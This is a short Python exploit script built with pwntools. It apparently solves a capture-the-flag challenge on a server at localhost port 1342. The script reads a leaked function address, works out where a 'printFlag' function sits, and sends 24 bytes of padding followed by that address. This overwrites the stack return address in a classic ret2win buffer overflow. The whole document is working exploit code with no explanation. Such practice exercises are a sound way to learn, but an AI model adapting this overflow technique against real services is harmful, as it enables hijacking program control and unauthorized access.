#!/usr/bin/env python3

from pwn import *

#elf = ELF('./server')
#p = elf.process()

host="localhost"
port=1342

p = remote(host, port)

start_offset = 0x00000000000012da
printFlag_offset = 0x0000000000001255

given_start_address = p.recv().decode().split('\n')[-3].split('0x')[-1]
printFlag_address = int(given_start_address,16) - start_offset + printFlag_offset
log.info('Address of start: 0x{}'.format(given_start_address))
log.info('Address of printFlag: {}'.format(hex(printFlag_address)))

payload = [
    b'A' * 24,
    p64(printFlag_address)
]

payload = b"".join(payload)
log.info('Sending Payload...')
p.sendline(payload)
p.interactive()
